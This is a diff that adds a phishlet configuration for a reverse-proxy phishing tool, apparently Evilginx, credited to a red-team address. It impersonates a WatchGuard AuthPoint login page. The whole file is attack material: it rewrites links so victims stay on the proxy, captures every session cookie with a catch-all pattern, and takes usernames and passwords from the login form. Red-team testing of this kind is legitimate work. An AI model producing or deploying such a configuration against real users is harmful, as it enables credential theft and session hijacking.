@@ -1,0 +1,34 @@
+name: 'watchguard'
+author: 'redteamnsw@team.telstra.com'
+min_ver: '2.4.2'
+proxy_hosts:
+  - {phish_sub: 'tryauthpoint', orig_sub: 'tryauthpoint', domain: 'watchguard.com', session: true, is_landing: true}
+sub_filters:
+  # replace all hyperlinks
+  - {triggers_on: 'tryauthpoint.watchguard.com', orig_sub: 'tryauthpoint', domain: 'watchguard.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # replace all URLs
+  #- {triggers_on: 'tryauthpoint.watchguard.com', orig_sub: 'tryauthpoint', domain: 'watchguard.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'tryauthpoint.watchguard.com', orig_sub: 'tryauthpoint', domain: 'watchguard.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  # enter here an exact domain which sets session tokens (cookies) to be captured
+  - domain: 'tryauthpoint.watchguard.com'
+    #keys: ['wg_portald_session_id']
+    keys: ['.*,regexp']
+auth_urls:
+  # use this section to query these endpoints while authenticated in order to capture session tokens
+  - '/'
+credentials:
+  # capture creds from web form; keys/search are regexps; type can be post or json
+  username:
+    key: '(username)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(password)'
+    search: '(.*)'
+    type: 'post'
+login:
+  # enter here an exact authentication endpoint
+  domain: 'tryauthpoint.watchguard.com'
+  path: '/auth/login'
+
